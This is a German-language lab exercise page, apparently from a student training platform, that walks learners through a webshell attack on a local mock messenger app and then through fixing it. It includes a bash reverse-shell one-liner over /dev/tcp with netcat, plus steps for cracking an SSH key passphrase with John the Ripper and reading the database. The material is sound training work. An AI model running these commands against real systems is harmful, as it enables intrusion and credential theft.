<h3 id="webshell-1">Webshell</h3>
<p>Webshells sind Skripte die, wenn sie auf einen Webserver
eingeschleust werden, einen Fernzugriff (Backdoor) f√ºr einen/eine
Angreifer/-in darstellen. Eine Webshell kann in jeder Programmiersprache
(z.B. ASP, PHP, JSP, Python, Ruby, C++, usw.) geschrieben sein, der
Zielserver sollte jedoch die Sprache unterst√ºtzen, damit die Webshell
ausgef√ºhrt werden kann. Webshells k√∂nnen in verschiedenen Formen
auftreten, eine beliebte Form ist z.B. eine Datei mit nur einer beliebig
Langen Zeile, die dazu noch bspw. base64 codiert ist. Diese Art von
Formatierung verschleiert den Code und erschwert dem/der Leser/-in der
Datei den Code zu verstehen und als Webshell zu enttarnen.</p>
<p>Die Webshell dient in den meisten F√§llen als Einstiegspunkt um
Befehle auszuf√ºhren und um die damit verbundenen M√∂glichkeiten
auszunutzen, wie etwa die Privilegien-Eskalation (Zugriff verschaffen
auf Ressourcen die normalerweise erweiterte Berechtigungen erfordern),
weitere Dateien hochzuladen, sensible Daten zu stehlen, Create, Read,
Update und Delete-Operatoren durchzuf√ºhren oder auch um Programme
auszuf√ºhren.</p>
<p>Durch den Einsatz von Netzwerkwerkzeugen k√∂nnen Angreifer/-innen
Schwachstellen innerhalb eines Webservers finden und diese
Sicherheitsl√ºcken gezielt auszunutzen, um ihre Webshell auf den
Webserver zu transferieren. Sicherheitsl√ºcken wie das Einbinden von
nicht validierten Codes in die Webanwendung (Cross-Site-Scripting) oder
durch eine nicht validierte Dateiupload Funktion, wie es in dieser √úbung
der Fall, ist k√∂nnen dazu genutzt werden, um die Webshell zu
platzieren.</p>
<h3 id="webshell-skript-1"><strong>Webshell</strong>
<strong>(Skript)</strong></h3>
<p>Eine base64 und in eine Zeile formatierte PHP-Datei. Enth√§lt den Code
um den Angriff f√ºr diese √úbung durchzuf√ºhren.</p>
<h3 id="allgemeine-programme-1">Allgemeine Programme</h3>
<ul>
<li><p><strong>OpenSSH-Server</strong></p>
<p>SSH (Secure Shell) ist ein Internetprotokoll und dient dem sicheren
Zugriff auf entfernte Rechner. √úber SSH kann eine Terminalsitzung
ge√∂ffnet werden, aber auch Daten sicher kopiert werden.</p>
<p>OpenSSH ist ein Programmpaket f√ºr die Remoteanmeldung via
SSH-Protokoll</p>
<p>Je nach Konfiguration k√∂nnen verschieden
Authentifizierungsm√∂glichkeiten verwendet werden, u.a. die
Zwei-Faktor-Authentisierung oder dem Public-Private-Key
Verfahren.</p></li>
<li><p><strong>Nano</strong></p>
<p>Ein Texteditor, welches die Bearbeitung von Dateien im Terminal
erm√∂glicht</p></li>
</ul>
<h3 id="angreifer-in-1">Angreifer/-in</h3>
<ul>
<li><p><strong>w3af</strong></p>
<p>Open-Source-Sicherheitsscanner f√ºr Webanwendungen. Erm√∂glicht mittels
Plug-Ins das Scannen einer Webanwendung mit verschiedenen
Modulen.</p></li>
<li><p><strong>Kali Linux</strong></p>
<p>Eine auf Debian basierte Linux Distribution. Kali Linux stellt
Programme f√ºr Penetrationstest zur Verf√ºgung. Die auf dieser
Distribution installierten Programme unterst√ºtzen den/die Angreifer/-in,
in dieser √úbung bei dem Webshell-Angriff.</p>
<ul>
<li><p><strong>Netcat</strong></p>
<p>Netcat, kurz nc, ist ein universelles Kommandozeilenwerkzeug. Es kann
im Terminal oder in Skripten f√ºr die Kommunikation √ºber TCP- und
UDP-Netzwerkverbindungen (IPv4 und 6), aber auch lokale UNIX Domain
Sockets genutzt werden.</p></li>
<li><p><strong>John The Ripper</strong></p>
<p>Ist eine Software um Passw√∂rter zu entschl√ºsseln.</p>
<p>ssh2john.py [<strong>Schl√ºssedatei</strong>] &gt;
[<strong>Zieldatei</strong>] wird in dieser √úbung genutzt um die
Passphrase f√ºr einen privaten Schl√ºssel herauszufinden.</p></li>
<li><p><strong>Wordlist</strong></p>
<p>Zu dt. Passw√∂rterliste ist eine Liste an W√∂rtern, die meist in
Verbindung mit dem W√∂rterbuchangriff genutzt werden, um Passw√∂rter zu
knacken. Die hier verwendete W√∂rterliste ist rockyou.txt.</p></li>
</ul></li>
</ul>
<h3 id="server-seite-1">Server Seite</h3>
<ul>
<li><p><strong>Webserver</strong></p>
<p>Ziel des Webshell-Angriffs.</p>
<p>Stellt einen Mock-up eines <strong>Messenger</strong> zur
Verf√ºgung.</p>
<p>Der Server enth√§lt mehrere Benutzer/-innen und eine
Datenbankschnittstelle.</p>
<p>Der Server persistiert die hochgeladenen Dateien.</p>
<p>Das Layout des Dateisystems sieht folgenderma√üen aus:</p>
<ul>
<li><p>/<strong>var/www/html</strong>:</p>
<p>Hier liegen die Verzeichnisse und Dateien um die Webapplikation
darzustellen</p></li>
<li><p><strong>/etc</strong>:</p>
<p>Enth√§lt Konfigurationsdateien, z.B. die Dateien
<strong>passwd</strong> (Informationen √ºber alle Benutzerkonten) und
<strong>shadow</strong> (enth√§lt die verschl√ºsselten Passw√∂rter der
Benutzer bzw. Benutzerinnen)</p></li>
<li><p><strong>/home</strong>:</p>
<p>Enth√§lt Homeverzeichnisse. Das Homeverzeichnis f√ºr den root Benutzer
bzw. Benutzerin ist unter /root zu finden.</p></li>
</ul></li>
<li><p><strong>Webapplikation</strong></p>
<p>Eine statische Webseite, ohne Caching. Ein neu laden der Seite setzt
alle an der Webapplikation vorgenommen √Ñnderungen zur√ºck (geschriebene
Nachrichten werden nicht persistiert).</p>
<p>Beinhaltet eine Dateiupload-Funktion.</p>
<p>Der erste angezeigte Chat beinhaltet ein bereits auf den Server
hochgeladenes Bild.</p></li>
<li><p><strong>Datenbank</strong></p>
<p>Eine MySQL-Datenbank. Enth√§lt Daten √ºber die
Nachrichtenapplikation.</p></li>
</ul>
<h3 id="hilfreiche-unix-befehle-1">Hilfreiche Unix Befehle</h3>
<ul>
<li><strong>bash [Option] [Befehl]</strong>: F√ºhrt ein Befehl in der
Bash Konsole aus
<ul>
<li>bash -c ‚Äú&lt;-Befehl&gt;‚Äù</li>
<li>bash ./<ausf√ºhrbare_datei></li>
</ul></li>
<li><strong>ls [Option]</strong>: Steht f√ºr ‚Äúlist‚Äù, zeigt den Inhalt
eines Verzeichnisses an
<ul>
<li>ls -l ‚Äî&gt; zeigt weitere Informationen zum Inhalt an (z.B.
Dateirechte)</li>
<li>ls -la ‚Äî&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
einem ‚Äú.‚Äù beginnen)</li>
<li>ls -R ‚Äî&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
</ul></li>
<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht f√ºr ‚Äúchange
directory‚Äù, z.dt. ‚ÄúVerzeichnis wechseln‚Äù
<ul>
<li>cd .. ‚Äî&gt; wechselt bspw. in das √ºbergeordnete Verzeichnis</li>
</ul></li>
<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
Inhalt einer Datei auszugeben</li>
<li><strong>./<Datei></strong>: F√ºhrt die Datei aus</li>
<li><strong>chmod [Option] [Ziel]:</strong> Ver√§ndert Zugriffsrechte f√ºr
Verzeichnisse und Dateien
<ul>
<li>chmod +x [Ziel] ‚Äî&gt; F√ºgt die Berechtigung zum Ausf√ºhren hinzu</li>
</ul></li>
<li><strong>wc [Option] [Datei]:</strong> Steht f√ºr ‚Äúword count‚Äù, z√§hlt
W√∂rter, Zeichen und Bytes
<ul>
<li>wc -l [Datei] ****‚Äî&gt; z√§hlt die Zeilen in der Datei</li>
<li>wc -w [Datei] ****‚Äî&gt; z√§hlt die W√∂rter in der Datei</li>
</ul></li>
<li><strong>rm</strong> <strong>[Option]</strong>
<strong>[Datei/Verzeichnis]</strong>: L√∂scht eine Datei oder ein
Verzeichnis
<ul>
<li>rm [Datei] ‚Äî&gt; l√∂scht eine Datei</li>
<li>rm -rf [Verzeichnis] ‚Äî&gt; l√∂scht Verzeichnis rekursiv und ohne
Nachfrage</li>
</ul></li>
</ul>
<h2 id="aufbau-der-√ºbung-1">Aufbau der √úbung</h2>
<p>In dieser √úbung werden Sie verschiedene Perspektiven einnehmen. Die
‚Äúnormalen‚Äù Nutzer/-innen (Einf√ºhrung), die die Webanwendung als
Nachrichtenapplikation nutzen. Die Angreifer/-innen Perspektive
(Webshell-Angriff), die einen Angriff auf den Webserver durchf√ºhren und
schlussendlich die Perspektive eines/r Serveradministrator/-in, welche
die Sicherheitsl√ºcke behebt.</p>
<h3 id="einf√ºhrung-1">Einf√ºhrung</h3>
<p>√ñffnen Sie die Webseite ‚Äúlocalhost:8082‚Äù in einem Browser Ihrer Wahl,
in dem Sie die genannte URL in die Suchleiste eingeben. Machen Sie sich
mit der Webseite und deren Funktionen vertraut.</p>
<div class="sourceCode" id="cb21"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">üí°</span> Mit Hilfe der Netzwerkanalyse aus den eingebauten Entwicklerwerkzeugen des Browsers k√∂nnen HTTP Anfragen und Antworten der Webseite verfolgt werden.</span></code></pre></div>
<p>üë§ <strong>(Perspektive: Anwender/-in)</strong></p>
<p>Laden Sie vorerst einmal eine normale Bilddatei hoch, in dem Sie
unten links in der Chatleiste auf die B√ºroklammer klicken. Es erscheint
ein grauer Screen. Dr√ºcken Sie erneut auf die B√ºroklammer um ein Bild
auszuw√§hlen. Mit einem Klick auf den Papierflieger l√§sst sich das Bild
hochladen.</p>
<h3 id="webshell-angriff-1">Webshell-Angriff</h3>
<ol type="1">
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>Loggen Sie sich in den w3af Container und f√ºhren Sie das Skript
<strong>w3af_console</strong> aus, indem Sie folgenden Befehl</p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./w3af_console</span></span></code></pre></div>
<p>im Terminal ausf√ºhren.</p>
<p>Mit dem Befehl</p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="bu">help</span> <span class="pp">[</span><span class="ss">Option</span><span class="pp">]</span></span></code></pre></div>
<p>werden Ihnen die verschiedenen Befehle und deren Beschreibung von
w3af angezeigt. Die drei Befehle, die Sie in dieser √úbung verwenden
werden sind <strong>Plug-Ins</strong>, <strong>target</strong> und
<strong>start</strong>.</p>
<p>Geben Sie <strong>Plug-Ins</strong> in das Terminal ein, Sie sollten
nun in der Plug-Ins Oberfl√§che sein. Mit einer weiteren Eingabe von
<strong>help</strong> werden Ihnen die verschieden Scanmodule angezeigt.
Aktivieren Sie die Module <strong>web_spider</strong> und
<strong>file_upload</strong>, in dem Sie die Befehle</p>
<div class="sourceCode" id="cb24"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">crawl</span> web_spider</span></code></pre></div>
<p>und</p>
<div class="sourceCode" id="cb25"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> file_upload</span></code></pre></div>
<p>nacheinander ausf√ºhren.</p>
<p>Mit <strong>back</strong> gelangen Sie wieder in die vorherige
Oberfl√§che.</p>
<p>Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als
Ihr Ziel.</p>
<p>Daf√ºr m√ºssen Sie den Befehl <strong>target</strong> eingeben, gefolgt
von dem Befehl</p>
<div class="sourceCode" id="cb26"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> target http://<span class="op">&lt;</span>local_ip_adresse<span class="op">&gt;</span>:8082</span></code></pre></div>
<p>Mit der Eingabe von <strong>view</strong> lassen sich die Ziele
einsehen.</p>
<p>Kehren Sie wieder in die urspr√ºngliche Oberfl√§che zur√ºck
(<strong>back</strong>) und starten Sie den Scan √ºber den Befehl
<strong>start.</strong></p>
<p>Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen:</p>
<ul>
<li>Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;</li>
<li>Welche URLs existieren f√ºr die Ziel Webanwendung und wo werden
eventuell von dem/der Benutzer/-in hochgeladene Dateien
abgespeichert</li>
</ul>
<p>beantworten.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>Laden Sie die Webshell (webshell.php) √ºber die Upload Funktion der
Webseite auf den Webserver und √∂ffnen Sie das Skript √ºber den Browser,
indem Sie in der Suchleiste die URL</p>
<pre><code>[localhost:8082](http://localhost:8082)/[storage_path]/[file_name] </code></pre>
<p>eingeben. Das Passwort um f√ºr die Autorisierung der Webshell ist:
‚Äú<strong>j<sub>82BQC;3N&lt;`HK</sub></strong>‚Äù.</p>
<p>Sammeln Sie Informationen √ºber den Server, indem Sie die oben
genannten <strong>Unix Befehle</strong> verwenden um sich durch das
Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im
Abschnitt <strong>Server Seite,</strong> unter <strong>Allgemeines /
Angriff,</strong> des Dateisystems oben beschrieben.</p>
<p>Um die Informationssuche zu automatisieren k√∂nnen Sie das Skript
<strong>linpeas.sh</strong> hochladen und ausf√ºhren. Sie k√∂nnen das
Skript auch √ºber die Webseite hochladen oder die Upload-Funktion der
Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben
Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden
zum ausf√ºhren des Skriptes.</p>
<div class="sourceCode" id="cb28"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> ./linpeas.sh</span></code></pre></div>
<div class="sourceCode" id="cb29"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">üí°</span> Optional <span class="at">-</span> Reverse Shell: </span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Loggen</span> Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname <span class="at">-i</span> ausgeben. </span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Anschlie√üend</span> k√∂nnen Sie den Befehl nc <span class="at">-lnvp</span> <span class="pp">[</span><span class="ss">port</span><span class="pp">]</span> ausf√ºhren. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. </span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Sende</span> Senden Sie den Befehl </span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-c</span> <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/[client_ip]/[port] 0&gt;&amp;1&quot;</span></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="ex">√ºber</span> die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und √ºbergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal. Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden </span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="ex">sein.</span> Nun k√∂nnen Sie statt im Browser √ºber eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausf√ºhrung auf der Reverse Shell </span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="ex">koloriert</span> bzw. formatiert angezeigt.</span></code></pre></div>
<p>linpeas.sh gibt Ihnen interessante Informationen, wie
Systeminformationen, gefundene Dateien von Relevanz und andere n√ºtzliche
Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in
einem Terminal ausgeben lassen).</p>
<p>Suchen Sie in der Ausgabe nach Authentifizierungsinformation f√ºr die
Datenbank und Schl√ºssel f√ºr eine SSH Verbindung.</p>
<p>Lokalisieren Sie das SSH Verzeichnis, des Eigent√ºmers der Schl√ºssel
und √ºberpr√ºfen Sie die Rechte der Dateien. Kopieren Sie sich den
privaten Schl√ºssel</p>
<p>√ñffnen Sie im Kali Linux Container ein Terminal um eine SSH
Verbindung zum Webserver herzustellen.</p>
<div class="sourceCode" id="cb30"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="op">&lt;</span>username<span class="op">&gt;</span>@<span class="op">&lt;</span>webserver_ip_adress<span class="op">&gt;</span></span></code></pre></div>
<p>Die SSH Verbindung scheint passwortgesch√ºtzt zu sein.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>In diesem Schritt werden Sie das Passwort des privaten Schl√ºssels
knacken.</p>
<p>Erstellen Sie daf√ºr eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali
Linux Container und f√ºgen Sie den vom Webserver kopierten Schl√ºssel in
die erstellte Datei ein. Navigieren Sie hierf√ºr in das
Homeverzeichnis.</p>
<div class="sourceCode" id="cb31"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home <span class="kw">&amp;&amp;</span> <span class="fu">nano</span> <span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa</span></code></pre></div>
<p>Das Programm John The Ripper kann die Schl√ºsseldatei nicht direkt
verarbeiten. Deshalb muss der Schl√ºssel zuerst in einen Hash umgewandelt
werden, den John The Ripper interpretieren kann.</p>
<p>Nutzen Sie daf√ºr ssh2john.py. Mit dem Befehl</p>
<div class="sourceCode" id="cb32"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> ssh2john.py [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa] <span class="op">&gt;</span> [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.hash] </span></code></pre></div>
<p>wird eine Datei, welche einen kryptografisch verschl√ºsselten
Schl√ºssel enth√§lt, in einen Hash umgewandelt und in die zweite Datei
geschrieben.</p>
<div class="sourceCode" id="cb33"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt <span class="pp">[</span><span class="ss">hash_file</span><span class="pp">]</span></span></code></pre></div>
<p>Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut
sich √ºber SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung
sehen Sie das Terminal des Webservers.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>In letzten Schritt der Angreifer/-innen Perspektive werden Sie
versuchen Daten aus der Datenbank zu lesen.</p>
<p>Verbinden Sie sich mit der Datenbank, indem Sie die
Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl
einf√ºgen und ausf√ºhren.</p>
<div class="sourceCode" id="cb34"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-u</span> <span class="pp">[</span><span class="ss">username</span><span class="pp">]</span> <span class="at">-p</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">host_name</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">database_name</span><span class="pp">]</span></span></code></pre></div>
<p>Geben Sie das Passwort bei der Aufforderung ein und best√§tigen Sie
dies mit der Enter-Taste.</p>
<p>N√ºtzliche SQL-Befehle:</p>
<div class="sourceCode" id="cb35"><pre
class="sourceCode sql"><code class="sourceCode sql"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>SHOW <span class="kw">TABLES</span>;</span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> [database_name].[table_name];</span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Die Funktionen ST_X(position) und ST_Y(position) <span class="op">..</span>. wandelt das Attribut  </span>
<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> <span class="ot">&quot;position&quot;</span> <span class="kw">in</span> latitude und longitude (Koordinaten) um</span>
<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> z.B. <span class="kw">SELECT</span> ST_X(position), ST_Y(position) <span class="kw">FROM</span> [table_name]</span>
<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Weitere Abfragen finden Sie <span class="kw">in</span> den Dateien, <span class="kw">in</span> dem die </span>
<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Authentifizierungsinformation gefunden wurden.</span></code></pre></div>
<p>Mit <strong>exit</strong> verlassen Sie die MySQL Oberfl√§che
wieder.</p></li>
</ol>
<h3 id="behebung-der-sicherheitsl√ºcke-1">Behebung der
Sicherheitsl√ºcke</h3>
<p>üõ†Ô∏è <strong>(Perspektive: Serveradministrator/-in)</strong></p>
<p>Im finalen Schritt dieser √úbung wechseln Sie in die Rolle eines/r
Serveradministrator/-in.</p>
<p>Wichtig ist es, dass die hier gezeigten Ma√ünahmen unvollst√§ndig sind
um einen ausreichenden Schutz gegen√ºber dieser Sicherheitsl√ºcke zu
gew√§hren. Die Ma√ünahmen sind jedoch ausreichend f√ºr den Anwendungsfall
dieser √úbung.</p>
<ol type="1">
<li><p><strong>Ma√ünahme</strong></p>
<p>Erstellen Sie eine .htaccess Datei mit unten angef√ºhrtem Inhalt</p>
<div class="sourceCode" id="cb36"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> /var/www/html/public/uploads/images/.htaccess</span></code></pre></div>
<p>Inhalt der .htaccess Datei:</p>
<pre><code>RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
php_flag engine off</code></pre>
<p>Die htaccess Datei ist eine Konfigurationsdatei f√ºr einen Apache
Server. Sie enth√§lt Konfigurationen und Regeln bez√ºglich des
Verzeichnisses. Die htaccess Datei wird bei jeder Anfrage an den Server
ausgewertet und angewandt.</p>
<p>Probieren Sie die Webshell noch einmal √ºber den Browser
aufzurufen.</p>
<p>Der Inhalt der Datei verhindert das Ausf√ºhren von .ph* (PHP) Dateien
in dem Verzeichnis.</p></li>
<li><p><strong>Ma√ünahme</strong></p>
<p>Eine unkontrollierte Dateiupload Funktion kann wie Sie in den
vorherigen Schritten gesehen haben, unkontrollierte Auswirkungen haben.
Deshalb werden Sie in diesem Schritt eine Dateiupload Validierung
einf√ºgen.</p>
<p>Lokalisieren Sie hierf√ºr die Datei <strong>upload.php</strong> im
Verzeichnis <strong>/var/www/html/php.</strong></p>
<p>Bearbeiten Sie diese Datei mit <strong>nano.</strong></p>
<p>Lokalisieren Sie die Zeilen:</p>
<div class="sourceCode" id="cb38"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>uploadUnSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="co">// uploadSanitized($fileStorage, $fileName, $tmpFileName);</span></span></code></pre></div>
<p>Kommentieren Sie die Funktion</p>
<div class="sourceCode" id="cb39"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a>uploadUnSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span></code></pre></div>
<p>aus und die Funktion</p>
<div class="sourceCode" id="cb40"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a>uploadSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span></code></pre></div>
<p>ein (<strong>‚Äú//‚Äù</strong> vor der Funktion entfernen/setzten).</p>
<p>In der uploadSanitized()-Funktion wird der mimeType (Dateityp z.B.
image/jpeg), welcher √ºber die HTTP-Anfrage gesetzt wird, gepr√ºft und
validiert. Bei erfolgreicher Validierung (Dateityp ist ein Bildformat)
wird der Dateiname und Dateiendung neu gesetzt und anschlie√üend wird die
Datei abgespeichert.</p>
<p>Der Webserver antwortet mit einem <strong>HTTP 200 OK</strong> beim
erfolgreichen hochladen einer validen Datei und ein <strong>HTTP 400 Bad
Request</strong> beim Hochladen einer nicht validen Bilddatei.</p>
<p>L√∂schen Sie nun die von Ihnen hochgeladene Webshell und linpeas.sh
Skript.</p>
<p>Die Sicherheitsl√ºcke ist f√ºr den Anwendungsfall dieser √úbung
gestoppt.</p></li>
</ol>
<h3 id="erneuter-angriffsversuch-1"><strong>Erneuter
Angriffsversuch</strong></h3>
<p>üòà <strong>(Perspektive: Angreifer/-in)</strong></p>
<p>Probieren Sie die Webshell noch einmal √ºber den Browser
hochzuladen.</p>
<p>Der Webserver sollte Ihnen das hochladen einer nicht validen Datei
verwehren.</p>
<p><strong>Sie haben nun das Ende der √úbung erreicht.</strong> üéä</p>

        </div>
        <div class="panel panel-right">
            <div class="tabs">
                <button class="tab active" onclick="switchTab(event, 'terminal-1')">KALI Client 1</button>
                <button class="tab" onclick="switchTab(event, 'terminal-2')">KALI Client 2</button>
            </div>
            <div id="terminal-1" class="vhlterminal active"
                data-startup-command="docker exec -it webshell_kali-client_1 bash">
            </div>
            <div id="terminal-2" class="vhlterminal"
                data-startup-command="docker exec -it webshell_kali-client_1 bash">
            </div>
        </div>
    </section>

    <!-- FOOTER -->
    <footer class="site-footer" style="bottom: 0;">
        <div class="container">
            <div class="row">
                <div class="ml-auto col-lg-4 col-md-5">
                    <p class="copyright-text">Copyright &copy; 2023 Jahresprojekt
                        <br>Projekt: VHL</a>
                    </p>
                </div>
                <div class="d-flex justify-content-center mx-auto col-lg-5 col-md-7 col-12">
                    <p class="mr-4">
                        <i class="fa fa-envelope-o mr-1"></i>
                        <a href="#">test@vhl.de</a>
                    </p>
                </div>
            </div>
        </div>
    </footer>

    <!-- SCRIPTS -->
    <script src="https://cdn.jsdelivr.net/npm/xterm@4.19.0/lib/xterm.js"></script>
    <script src="js/script.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.min.js"></script>
    <script src="js/frontend.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/aos.js"></script>
    <script src="js/smoothscroll.js"></script>
    <script src="js/custom.js"></script>
</body>

</html>